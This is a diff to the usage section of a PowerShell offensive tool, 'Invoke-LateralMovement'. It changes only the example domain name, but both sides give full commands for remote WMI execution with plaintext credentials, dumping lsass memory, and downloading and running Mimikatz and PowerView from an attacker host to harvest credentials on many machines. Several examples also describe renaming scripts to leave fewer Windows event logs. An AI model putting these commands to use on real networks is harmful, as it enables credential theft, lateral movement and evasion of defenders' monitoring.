@@ -17,18 +17,18 @@ This script is under the [BSD 3-Clause license](https://raw.githubusercontent.co
 #### Usage:
 .EXAMPLE  
 Perform ping back to 10.0.0.5 on a single host:  
-Invoke-LateralMovement -HostName 10.0.0.2 -WmiCommand -UserName AdminUser -Password P@55w0rd -Domain PWC -IP 10.0.0.5
+Invoke-LateralMovement -HostName 10.0.0.2 -WmiCommand -UserName AdminUser -Password P@55w0rd -Domain CORP -IP 10.0.0.5
 
 Perform ping back to 10.0.0.5 on multiple hosts:  
-Invoke-LateralMovement -HostList C:\temp\hosts.txt -WmiCommand -UserName AdminUser -Password P@55w0rd -Domain PWC -IP 10.0.0.5
+Invoke-LateralMovement -HostList C:\temp\hosts.txt -WmiCommand -UserName AdminUser -Password P@55w0rd -Domain CORP -IP 10.0.0.5
 
 .EXAMPLE  
 Open up notepad.exe on a single host with the -CustomCommand flag  
-Invoke-LateralMovement -HostName 10.0.0.2 -WmiCommand -UserName AdminUser -Password P@55w0rd -Domain PWC -CustomCommand "cmd.exe /c notepad.exe"
+Invoke-LateralMovement -HostName 10.0.0.2 -WmiCommand -UserName AdminUser -Password P@55w0rd -Domain CORP -CustomCommand "cmd.exe /c notepad.exe"
 
 .EXAMPLE  
 Perform "vssadmin list shadows" on a single host with the -CustomCommand flag and receive the results with the -Server flag  
-Invoke-LateralMovement -HostName 10.0.0.2 -WmiCommand -UserName AdminUser -Password P@55w0rd -Domain PWC -CustomCommand "cmd.exe /c vssadmin list shadows" -Server
+Invoke-LateralMovement -HostName 10.0.0.2 -WmiCommand -UserName AdminUser -Password P@55w0rd -Domain CORP -CustomCommand "cmd.exe /c vssadmin list shadows" -Server
 
 -----------------------------
 
@@ -51,38 +51,38 @@ Invoke-LateralMovement -HostName 10.0.0.2 -MMCCommand -CustomCommand "cmd.exe /c
 
 .EXAMPLE  
 Perform procdump on a single machine and pull the dump back to your local machine (Default will be on the Desktop):  
-Invoke-LateralMovement -HostName 10.0.0.2 -ProcDump -UserName AdminUser -Password P@55w0rd -Domain PWC -PDir C:\temp\procdump.exe
+Invoke-LateralMovement -HostName 10.0.0.2 -ProcDump -UserName AdminUser -Password P@55w0rd -Domain CORP -PDir C:\temp\procdump.exe
 
 Perform procdump on multiple machines and pull the dump back to your local machine (Default will be on the Desktop):  
-Invoke-LateralMovement -HostList C:\temp\hosts.txt -ProcDump -UserName AdminUser -Password P@55w0rd -Domain PWC -PDir C:\temp\procdump.exe
+Invoke-LateralMovement -HostList C:\temp\hosts.txt -ProcDump -UserName AdminUser -Password P@55w0rd -Domain CORP -PDir C:\temp\procdump.exe
 
 -----------------------------
 
 .EXAMPLE  
 Perform a minidump on the lsass process of a single machine and pull dump back to your local machine (Default will be on the Desktop):  
-Invoke-LateralMovement -HostName 10.0.0.2 -MiniDump -UserName AdminUser -Password P@55w0rd -Domain PWC
+Invoke-LateralMovement -HostName 10.0.0.2 -MiniDump -UserName AdminUser -Password P@55w0rd -Domain CORP
 
 -----------------------------
 
 .EXAMPLE  
 Perform I n v o k e - M i m i k a t z -DumpCreds on a single machine and pull results over SMB:  
-Invoke-LateralMovement -HostName 10.0.0.2 -InvMkatz -UserName AdminUser -Password P@55w0rd -Domain PWC -ScriptDir http://10.0.0.5/Invoke-Mimikatz.ps1
+Invoke-LateralMovement -HostName 10.0.0.2 -InvMkatz -UserName AdminUser -Password P@55w0rd -Domain CORP -ScriptDir http://10.0.0.5/Invoke-Mimikatz.ps1
  
 Perform I n v o k e - M i m i k a t z -DumpCreds on a multiple machine and pull results over SMB:  
-Invoke-LateralMovement -HostList C:\temp\hosts.txt -InvMkatz -UserName AdminUser -Password P@55w0rd -Domain PWC -ScriptDir http://10.0.0.5/Invoke-Mimikatz.ps1
+Invoke-LateralMovement -HostList C:\temp\hosts.txt -InvMkatz -UserName AdminUser -Password P@55w0rd -Domain CORP -ScriptDir http://10.0.0.5/Invoke-Mimikatz.ps1
 
 Perform I n v o k e - M i m i k a t z -DumpCreds on a single machine and pull results over HTTP on port 8080 with a custom script name (Less Windows event logs):  
-Invoke-LateralMovement -HostName 10.0.0.2 -MassKatz -UserName AdminUser -Password P@55w0rd -Domain PWC -ScriptDir http://10.0.0.5/Invoke-Update.ps1 -CustomCommand Invoke-Update -ServerPort 8080
+Invoke-LateralMovement -HostName 10.0.0.2 -MassKatz -UserName AdminUser -Password P@55w0rd -Domain CORP -ScriptDir http://10.0.0.5/Invoke-Update.ps1 -CustomCommand Invoke-Update -ServerPort 8080
  
 Perform I n v o k e - M i m i k a t z -DumpCreds on a multiple machine  with a custom script name (Less Windows event logs) and pull results over HTTP on port 80 into the C:\temp folder:  
-Invoke-LateralMovement -HostList C:\temp\hosts.txt -MassKatz -UserName AdminUser -Password P@55w0rd -Domain PWC -ScriptDir http://10.0.0.5/Invoke-Update.ps1 -CustomCommand Invoke-Update -OutputFolder "C:\temp"
+Invoke-LateralMovement -HostList C:\temp\hosts.txt -MassKatz -UserName AdminUser -Password P@55w0rd -Domain CORP -ScriptDir http://10.0.0.5/Invoke-Update.ps1 -CustomCommand Invoke-Update -OutputFolder "C:\temp"
 
 .EXAMPLE  
 Perform Get-DomainGroupMember on a single machine and pull results over HTTP on port 8080 with a custom script name (Less Windows event logs):  
-Invoke-LateralMovement -HostName 10.0.0.2 -ExecPS -UserName AdminUser -Password P@55w0rd -Domain PWC -ScriptDir http://10.0.0.5/PowerView.ps1 -CustomCommand "Get-DomainGroupMember 'Domain Admins'" 
+Invoke-LateralMovement -HostName 10.0.0.2 -ExecPS -UserName AdminUser -Password P@55w0rd -Domain CORP -ScriptDir http://10.0.0.5/PowerView.ps1 -CustomCommand "Get-DomainGroupMember 'Domain Admins'" 
  
 Perform Get-DomainGroupMember on a multiple machine and pull results over HTTP on port 8080 with a custom script name (Less Windows event logs):  
-Invoke-LateralMovement -HostList C:\temp\hosts.txt -ExecPS -UserName AdminUser -Password P@55w0rd -Domain PWC -ScriptDir http://10.0.0.5/PowerView.ps1 -CustomCommand "Get-DomainGroupMember 'Domain Admins'" 
+Invoke-LateralMovement -HostList C:\temp\hosts.txt -ExecPS -UserName AdminUser -Password P@55w0rd -Domain CORP -ScriptDir http://10.0.0.5/PowerView.ps1 -CustomCommand "Get-DomainGroupMember 'Domain Admins'" 
 
 -----------------------------
 #### Parameter Sets:
